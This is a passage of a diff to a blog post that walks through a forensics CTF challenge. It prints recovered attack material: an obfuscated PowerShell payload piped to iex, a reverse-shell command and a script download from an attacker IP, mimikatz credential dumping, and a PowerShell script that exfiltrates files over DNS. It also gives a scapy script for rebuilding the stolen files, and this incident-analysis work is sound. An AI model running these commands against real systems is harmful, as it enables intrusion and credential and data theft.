ADUAMQBiAGQAMQBkADUANAAwADQAZQA1AGMANQAzAGUAOAA3ADYAYwA3AGUANwBjADQAZgAzAGMANwAyADgANwA1ADQAOQBhADIAMwA1ADUAMgA2ADAANgA1ADYANwAwADcAMgBiAGUAYwA0ADYAOQA5ADQANgA5AGUAYgA0ADQAMQBjADUAYwA4AGQAMgBjAGIAYQAxADIAMwA3ADYAYQBlAGUAZgA0ADIANgBlAGMAZgA0AGIANQA3ADcAOAAyAGEAYwA2ADMAZQBiADcANgAxADgANABiADcAMgA5ADAAMgA2ADkAZgBlAGEANQBjADgAZgA4AGEAYwBjAGIAMgBkAGYANAA4AGQAOABmADkANgBjAGIAOQA4AGUAOQBjAGMAMwA3ADcAYwAyAGQAZQA2ADQAMwBkADYAMQA5AGIANwAyADYAZQA5ADcAYQA5ADQANQBkADEANgA0AGQANAA2AGQAZQBlADAAZgBlADUAMAAzADkAYwBlAGYAZgBhADQANwA1AGEAMQBkADMAOAA1ADkAMAA1AGIAMAAyADIAMQA1ADEAOQA2AGUAYgA0AGUAOAA1ADYAYgA4ADEAMAA1ADAAYQBlAGUAMgBlADYAYwBkAGEANQBiAGUANwAzADMAZAA1ADAAZgBjADYAMwA5AGEANABlADEAMABmADUAMwA2ADgANQBjADUAYgA5AGIAYQA3AGEAMwA1ADkANgBlADAAMgBiADYAZQA5AGEANgA0ADAAMAA0ADYAOABkAGMAMQAwADIAYwAzADgAOAAzAGIAMQBiADgAZgA1ADUAYQBmADIAZgBkAGMANAAzAGIANgA4AGUAOQBiADgANQBmADIAMAA5AGMAZAA1ADUAYgAyAGMAMwA4AGEAZABiADgAOAAwAGYANQBkADQAZgAzADkAYgA4AGYAOAA3ADIAYwAwAGUAMgAyADYAZgAzADUAOQAzADgANQA3ADYAYwAyADAANQBlADEANwBlADEAZgBjADQAOAAwAGUAZQAyADIANABhADUANwA4ADQAMwBiADIAZAA3ADYAYQBkADUANABhAGIAMwA1ADgANgA1AGYAYwAzAGEAYwA1ADAAMQA2ADgAZABlADMAYQA1AGEANwAxADQAMgBkAGQAZQA4AGMANwA5ADcAYgAzADUANwA3AGYAMgA5ADYAMgBlADcAOQA3AGUAYgBmAGUAMgBiAGIAMwA0ADkAOQAyADcAMwBlADgAZQBmADMAOAAxADUAMwA1ADcANABiADMAMABmADkAMgA3AGMAOAA5AGMANABlAGQAZQA3AGIAYQA2AGYANABkADAAMgBiADYAMgAyADQAZABlAGYANwBhADQAMAAxADMAYgBjADMAYwBjADkAZQBhADcANgBhADMAOAA0AGYAMwAwAGYAOQBmADUAOABlADgAZAAwADgANAAzADAANABlAGEAMwAyAGMAZAAzADgAYgA2ADUAMgBmAGQAMwBjADgANwBhADkAMwAxAGUAMABiADQAMwAzAGIAOAA1AGUAMwAzADEAYgBlAGMAMQBiAGYAYgBmAGIANAAzAGUANwBjAGMAMwAxADMAYwAwAGYAMQBlADAAZgBmAGEAOAAyADEANgA4ADgAMwA3ADMANgA5AGQAMgA2AGEAZAA1ADYAYwBmAGYANgAxADAAOAA3AGQAMwAyADYAMQBlADgAMgAzAGMAOAAxADkAMwBhADYANwA3ADcAYQA3ADMAYgAwAGMAMAA2AGEANwBiAGMAZABmADIAZQBjADUAYwAxADYAMABhAGUANQBlADAAZgA2ADMAOAA3ADEANgA0ADEAOAA1ADUAMgAzADUAYQA5ADMANQA0AGMAOABiADAAMgAwAGQAMgAyAGIANQBmADQAOQBhADQAYQAwADMAZAAxADkAMwAyADQAYgBkADUAMwAzADAANAAxADMAMwAxAGYANwAzADYAMgA1AGYAYwBhAGIAMQA2ADYANgBjAGQANgAwAGIANABkADYAOABhAGQAMQAzADEAMAA4AGYAYwBhAGUAOAA0ADYAYQAyAGMAOAA1AGUAMQA3ADgAOABiAGYANwBjAGMAZQAyADcAZgA1ADAAZQBiAGQAYQAwAGQAOAAyADQANABjADIAYQA4ADMAYQBkADIAOAAxAGUANgBiADMANABlADMAZABiADMAMQA1ADcANABjADEAZQBjAGUAZAAyAGIAMgA4ADEAYwBiADgAMgAwAGEAZgAzADUANgAyAGYAMwA3ADIANABmADkAOAA5ADcANwBiADUANQAzAGYAMgA=&#39;</span> |ConvERTtO-SecureSTRiNG -k <span style="color:#ae81ff">55</span>,<span style="color:#ae81ff">113</span>,<span style="color:#ae81ff">158</span>,<span style="color:#ae81ff">254</span>,<span style="color:#ae81ff">51</span>,<span style="color:#ae81ff">94</span>,<span style="color:#ae81ff">175</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">94</span>,<span style="color:#ae81ff">42</span>,<span style="color:#ae81ff">226</span>,<span style="color:#ae81ff">159</span>,<span style="color:#ae81ff">63</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">144</span>,<span style="color:#ae81ff">195</span>,<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">139</span>,<span style="color:#ae81ff">39</span>,<span style="color:#ae81ff">217</span>,<span style="color:#ae81ff">58</span>,<span style="color:#ae81ff">39</span>,<span style="color:#ae81ff">188</span>,<span style="color:#ae81ff">60</span>,<span style="color:#ae81ff">182</span>,<span style="color:#ae81ff">192</span>,<span style="color:#ae81ff">74</span>,<span style="color:#ae81ff">94</span>,<span style="color:#ae81ff">209</span>,<span style="color:#ae81ff">172</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">93</span>)).GetneTwoRKCrEDEnTIAl().pASsWoRD |. ( $PsHoME[<span style="color:#ae81ff">21</span>]+$psHOme[<span style="color:#ae81ff">34</span>]+<span style="color:#e6db74">&#39;x&#39;</span>)
 </span></span></code></pre></div><p>We notice at the end it pipes the output of the decoded payload into <code>( $PsHoME[21]+$psHOme[34]+'x')</code> which again is transated to <code>iex</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>(base) PS C:\Users\user&gt; ( $PsHoME[<span style="color:#ae81ff">21</span>]+$psHOme[<span style="color:#ae81ff">34</span>]+<span style="color:#e6db74">&#39;x&#39;</span>)
@@ -263,8 +262,12 @@ In this challenge we are given a .pcap file and a .vhdx file. Without having the
 </span></span><span style="display:flex;"><span>https<span style="color:#960050;background-color:#1e0010">:</span>//pastebin.com/hVCEUK1B
 </span></span></code></pre></div><p>Visiting this pastebin post, we get the first flag: <code>idek{MS_ExCel_DyN4m1c_D4ta_ExcH@ng3_1s_3a5y_t0_d3teCt}</code>!</p>
 <h2 id="part-2---credential-access-and-privesc">Part 2 - Credential Access and PrivEsc<a hidden class="anchor" aria-hidden="true" href="#part-2---credential-access-and-privesc">#</a></h2>
-<p>After having identified how the initial compromise happened, we can still keep looking at the powershell logs to see if we can spot any further malicious activity by the attacker there.</p>
-<p>To sum up the activity found in the log:</p>
+<p>After having identified how the initial compromise happened, we can still keep looking at the powershell logs to see if we can spot any further malicious activity by the attacker there. The description of part 2 helps us again by giving out hints to search for leaked credentials:</p>
+<pre tabindex="0"><code>We suspect multiple accounts were compromised. The attacker moved laterally. Therefore, the credentials that he used to move laterally must have leaked. Let&#39;s analyze the sequence of actions taken by the attacker and tell us what he has obtained for later purposes?
+
+Note: The flag is wrapped and divided into 2 parts
+</code></pre><p>So maybe logs will hint out any command related to credentials for lateral movement.</p>
+<p>After searching the logs, to sum up the activity found in the log, I gathered the following commands:</p>
 <pre tabindex="0"><code>[+] http://172.21.20.96/windowsupdate.ps1
     [*] Initial Access
 [+] &#34;C:\Users\IEUser\AppData\Local\ Temp\SecurityUpdate.exe&#34; 172.21.20.96 4444 -e cmd.exe
@@ -285,8 +288,8 @@ In this challenge we are given a .pcap file and a .vhdx file. Without having the
     [*] Runs mimikatz.
 [+] C:\Windows\system32\net1  user netadmin S3cr3tpa5sw0rD /add
     [*] Uses net1 (duplicate of net.exe found in System32) to create a new user account with the specified creds in the command.
-</code></pre><p>From the above commands executed and logged on the powershell logs (<code>Microsoft-Windows-Sysmon54Operational.evtx</code>) we can see cear indications of mimikatz usage both in the LSASS being dumped in the <code>errordump</code> file but also trying to decrypt credentials found in a possible DPAPI file named <code>DB79FF0C49C20D542F3690C933AC3046</code>. We can try to mimic what the attacker did since there is nothing else juicy here to look at. We will dump both files and try to use mimikatz to see what we can find.</p>
-<h3 id="part-1-mimikatz---errordmp-file">[Part 1] Mimikatz - error.dmp file<a hidden class="anchor" aria-hidden="true" href="#part-1-mimikatz---errordmp-file">#</a></h3>
+</code></pre><p>From the above commands executed and logged on the powershell logs (<code>Microsoft-Windows-Sysmon54Operational.evtx</code>) we can see clear indications of mimikatz usage both in the LSASS being dumped in the <code>errordump</code> file but also trying to decrypt credentials found in a possible DPAPI file named <code>DB79FF0C49C20D542F3690C933AC3046</code>. We can try to mimic what the attacker did since there is nothing else juicy here to look at. We will dump both files and try to use mimikatz to see what we can find. After all, mimikatz seems our best chance based on what the description states.</p>
+<h3 id="first-half-of-the-flag-mimikatz---errordmp-file">[First half of the flag] Mimikatz - error.dmp file<a hidden class="anchor" aria-hidden="true" href="#first-half-of-the-flag-mimikatz---errordmp-file">#</a></h3>
 <p>Starting with the <code>error.dmp</code> file, we extract it from Autopsy and put it in the same directory as the <code>mimikatz.exe</code> tool - a popular tool used to extract credentials.</p>
 <pre tabindex="0"><code>C:\Users\user\mimikatz\x64&gt;mimikatz.exe
 
@@ -336,7 +339,7 @@ SID               : S-1-5-21-1610009768-122519599-941061767-1000
 
 Authentication Id : 0 ; 95278 (00000000:0001742e)
 </code></pre><p>And we spot the first part of the flag as the password of the user <code>IEUser</code> we saw multiple times being referenced in the logs: <code>idek{crEDentia</code></p>
-<h3 id="part-2-mimikatz---db79ff0c49c20d542f3690c933ac3046-possible-dpapi-file">[Part 2] Mimikatz - DB79FF0C49C20D542F3690C933AC3046 possible DPAPI file<a hidden class="anchor" aria-hidden="true" href="#part-2-mimikatz---db79ff0c49c20d542f3690c933ac3046-possible-dpapi-file">#</a></h3>
+<h3 id="second-half-of-the-flag-mimikatz---db79ff0c49c20d542f3690c933ac3046-possible-dpapi-file">[Second half of the flag] Mimikatz - DB79FF0C49C20D542F3690C933AC3046 possible DPAPI file<a hidden class="anchor" aria-hidden="true" href="#second-half-of-the-flag-mimikatz---db79ff0c49c20d542f3690c933ac3046-possible-dpapi-file">#</a></h3>
 <p>The other file we saw being manipulated before mimikatz was a file named DB79FF0C49C20D542F3690C933AC3046. We can spot strings like <strong>Local Credential Data</strong>. Searching online what this file is, we can find references to DPAPI. To decrypt these credentials, I followed this article after using <code>intext:&quot;Local Credential Data Mimikatz&quot;</code>:</p>
 <ul>
 <li><a href="https://steemit.com/cmd/@evil0x00/mimikatz-get-local-credentials">https://steemit.com/cmd/@evil0x00/mimikatz-get-local-credentials</a></li>
@@ -504,26 +507,23 @@ Decrypting Credential:
   CredentialBlob : l_4C3S5_f0R_1@73rAl_mOv3M3n7}
   Attributes     : 0
 </code></pre><p>So the whole flag is: <code>idek{crEDential_4C3S5_f0R_1@73rAl_mOv3M3n7}</code></p>
-<h2 id="part-3--">Part 3 -<a hidden class="anchor" aria-hidden="true" href="#part-3--">#</a></h2>
-<p>The previous flag can be used as a hint on how to move on, since we still have a big .pcap we have not touched upon and I already felt a bit lost at this point.</p>
+<h2 id="part-3---dns-exfiltration-and-reconstruction">Part 3 - DNS Exfiltration and reconstruction<a hidden class="anchor" aria-hidden="true" href="#part-3---dns-exfiltration-and-reconstruction">#</a></h2>
+<p>The description of the final part states:</p>
+<pre tabindex="0"><code>We tried to collect more network data for analysis, but because of the late approach, we only had data for a short period of time before we detected the attack and performed a shutdown of all machine at about 19:00 UTC. However I hope it can help you to answer the question whether the attacker has access to our important data?
+</code></pre><p>The previous flag can be used as a hint on how to move on, since we still have a big .pcap we have not touched upon and I already felt a bit lost at this point.</p>
 <p>The flag from part 2 refers to <code>stealing credentials in order to do lateral movement</code>. We can also see that the second part of the flag was from a target domain with IP address <code>192.168.209.134</code>. Searching this IP address inside <code>Autopsy</code> as we previously did, we see logs related to RDP connection:</p>
-<p><img loading="lazy" src="/posts/writeups/training/idek2022/autopsy4.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/training/idek2022/autopsy4.png"></p>
 <p>So maybe the threat actor stole credentials for <code>192.168.209.134</code> and tried lateral moving into it through RDP&hellip;? Observing the traffic via wireshark we indeed see this IP and the related RDP traffic:</p>
-<p><img loading="lazy" src="/posts/writeups/training/idek2022/wireshark_rdp.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/training/idek2022/wireshark_rdp.png"></p>
 <p>This was kind of a dead end since there was nothing else juicy in the logs to investigate and the rest of the traffic did not really look promising. It was then that I remembered a challenge I had played once, related to RDP and bitmaps. Searching for <code>RDP forensics</code> I gave a read to the following article and I got my hopes high again (since it also refers to lateral movement scenarios):</p>
 <ul>
 <li><a href="https://medium.com/@egycondor/rdp-bitmap-forensics-for-dfir-investigations-f4f627431275">https://medium.com/@egycondor/rdp-bitmap-forensics-for-dfir-investigations-f4f627431275</a></li>
 </ul>
 <p>Basically, when an RDP connection happens, RDP caches images of the screen of the connection for optimization. Maybe we can try to read the corresponding files the article suggests and get lucky? I shot my shot and navigated to <code>C:\Users\IEUser\AppData\Local\Microsoft\Terminal Server Client\Cache</code> where I extracted all the <code>.bin</code> files:</p>
-<p><img loading="lazy" src="/posts/writeups/training/idek2022/cachebitmaps.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/training/idek2022/cachebitmaps.png"></p>
 <p>The article suggests using the <code>https://github.com/ANSSI-FR/bmc-tools.git</code> to extract all the bitmap images. Doing so, we will end up with the bitmap images, to which when put together, will finally lead us to the next clue on how to continue:</p>
-<p><img loading="lazy" src="/posts/writeups/training/idek2022/bitmap1.png" alt="alt text"  />
-</p>
-<p><img loading="lazy" src="/posts/writeups/training/idek2022/bitmap2.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/training/idek2022/bitmap1.png"></p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/training/idek2022/bitmap2.png"></p>
 <p>(Images where taken from <a href="https://www.cnblogs.com/WXjzc/p/17061485.html">here</a>)</p>
 <p>We can see a <code>Start-BitsTransfer</code> command is being used to transfer the file <code>https://gist.githubusercontent.com/bquanman/cb6a4b2420d9f3d2f27287dcb46661d6/raw/5c30ba3542b952e2be68491c825f0145ed0da14e/update.ps1</code> into another file in the Administrator account.</p>
 <p>Following this url, we get the update.ps1 script which is visibly obfuscated:</p>
@@ -592,8 +592,7 @@ Decrypting Credential:
 <li><a href="https://isc.sans.edu/diary/30636">https://isc.sans.edu/diary/30636</a></li>
 </ul>
 <p>Removing the <code>| iex</code> from the previous output and running the obfuscated layer in an online powershell interpreted, we finally get the plaintext script:</p>
-<p><img loading="lazy" src="/posts/writeups/training/idek2022/plaintextPowershell.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/training/idek2022/plaintextPowershell.png"></p>
 <p>As a note, I had to put the whole code into notepad++ to remove the newline character that was triggering errors both in a powershell terminal and in the <code>tio.run</code> powershell online interpreter.</p>
 <p>The plaintext script is:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$d = <span style="color:#e6db74">&#34;172.21.20.96&#34;</span>;
@@ -601,7 +600,7 @@ Decrypting Credential:
 </span></span><span style="display:flex;"><span>$b = <span style="color:#ae81ff">57</span>;
 </span></span><span style="display:flex;"><span>Get - ChildItem <span style="color:#e6db74">&#34;.&#34;</span> | <span style="color:#66d9ef">Foreach</span> - Object {
 </span></span><span style="display:flex;"><span>    $a = [<span style="color:#66d9ef">System.Convert</span>]::ToBase64String($Enc.GetBytes($_.Name));
-</span></span><span style="display:flex;"><span>    $R = {
+</span></span><span style="display:flex;"><span>    $R = { 
 </span></span><span style="display:flex;"><span>        $D,
 </span></span><span style="display:flex;"><span>        $K = $Args;$S = <span style="color:#ae81ff">0</span>. <span style="color:#ae81ff">.255</span>;<span style="color:#ae81ff">0</span>. <span style="color:#ae81ff">.255</span> | % {
 </span></span><span style="display:flex;"><span>            $J = ($J + $S[$_] + $K[$_ % $K.Length]) % <span style="color:#ae81ff">256</span>;$S[$_],
@@ -635,7 +634,73 @@ Decrypting Credential:
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>    nslookup - type = A $r$a.$d
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div>
+</span></span></code></pre></div><p>So what will end up being executed on the victim&rsquo;s machine is a <code>ps1</code> script that uses RC4 and b64 to exfiltrate data. The form of the exfiltrated data observed through Wireshark are of the following form:</p>
+<pre tabindex="0"><code>PgNq1d7oaEmhEIK7jWCvLaBLcry7VkwjF7pOETJxngBa4UZwo+edngabf.Z8ZZeOZotc/pI40.U2VjcmV0UGxhbi5wZGY=
+</code></pre><p>Basically, the exfiltrated files are sent part by part, splitted by a <code>dot</code>, where the last part is the filename of the file that is being exfiltrated. In the example above, the file that is exfiltrated is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64decode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> b64decode(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;U2VjcmV0UGxhbi5wZGY=&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;SecretPlan.pdf&#39;</span>
+</span></span></code></pre></div><p>So to reconstruct a specific file, we need to gather all the base64 data related to the specified filename, decode them from base64 and decrypt from RC4 using the key found in the previously deobfuscated powershell code <code>[System.IO.File]::ReadAllBytes($_.FullName)</code>.</p>
+<p>To avoid doing this by hand, I wrote a python scapy script to do all of this automatically:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64decode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> ARC4
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt_RC4</span>(ciphertext):
+</span></span><span style="display:flex;"><span>	cipher <span style="color:#f92672">=</span> ARC4<span style="color:#f92672">.</span>new(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;[System.IO.File]::ReadAllBytes($_.FullName)&#39;</span>)
+</span></span><span style="display:flex;"><span>	decrypted <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(ciphertext)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> decrypted
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pkts <span style="color:#f92672">=</span> rdpcap(<span style="color:#e6db74">&#34;./HiddenGem.pcapng&#34;</span>)
+</span></span><span style="display:flex;"><span>packets <span style="color:#f92672">=</span> [p <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> pkts <span style="color:#66d9ef">if</span> IP <span style="color:#f92672">in</span> p <span style="color:#f92672">and</span> (p[IP]<span style="color:#f92672">.</span>src <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;172.21.20.96&#34;</span> <span style="color:#f92672">or</span> p[IP]<span style="color:#f92672">.</span>dst <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;172.21.20.96&#34;</span>)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exfiltrated_files <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> packets:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> p<span style="color:#f92672">.</span>haslayer(DNS) <span style="color:#f92672">and</span> p[DNS]<span style="color:#f92672">.</span>id <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0002</span> <span style="color:#f92672">and</span> p[DNS]<span style="color:#f92672">.</span>qr <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>		exfiltrated <span style="color:#f92672">=</span> p[DNSQR]<span style="color:#f92672">.</span>qname<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>		parts <span style="color:#f92672">=</span> exfiltrated<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		filename <span style="color:#f92672">=</span> b64decode(parts[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> filename <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> exfiltrated_files<span style="color:#f92672">.</span>keys():
+</span></span><span style="display:flex;"><span>			exfiltrated_files[filename] <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		exfiltrated_files[filename] <span style="color:#f92672">+=</span> b64decode(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(parts[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> filename, filedata <span style="color:#f92672">in</span> exfiltrated_files<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>    decrypted <span style="color:#f92672">=</span> decrypt_RC4(filedata)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    byte_values <span style="color:#f92672">=</span> [int(num) <span style="color:#66d9ef">for</span> num <span style="color:#f92672">in</span> decrypted<span style="color:#f92672">.</span>split()]
+</span></span><span style="display:flex;"><span>    byte_data <span style="color:#f92672">=</span> bytes(byte_values)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(filename, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>write(byte_data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Successfully reconstructed </span><span style="color:#e6db74">{</span>filename<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>The script does the following:</p>
+<ul>
+<li>Inspects only packets related to the IP address <code>172.21.20.96</code> found in the ps1 script.</li>
+<li>Verifies that the packet has a <code>DNS</code> layer, its transaction id is of type <code>0x0002</code> and its query type is <code>0</code> (only requests, not responses). This makes sure we get only packets related to the exfiltrated files and avoid duplicates.</li>
+<li>Gets the data, splits based on dot, and stores the content based on the filename.</li>
+<li>Takes care of decrypting using RC4.</li>
+<li>Stores the data in the corresponding file.</li>
+</ul>
+<p>After running the script, we get the reconstructed files:</p>
+<pre tabindex="0"><code>└─$ python nslookup.py            
+Successfully reconstructed des.txt
+Successfully reconstructed KCSC.jpg
+Successfully reconstructed readme.txt
+Successfully reconstructed readme2.txt
+Successfully reconstructed SecretPlan.pdf
+Successfully reconstructed update.ps1
+Successfully reconstructed vov.txt
+Successfully reconstructed zoneblue.jpg
+</code></pre><p>Trying them one by one, we get our flag inside the <code>SecretPlan.pdf</code>:</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/training/idek2022/flag.png"></p>
+<p>That is it for this one. Overall an amazing challenge both for training and for learning. Once again, <strong>thanks to bquanman</strong> for letting me give a try to his challenge:)</p>
+
 
   </div>
 
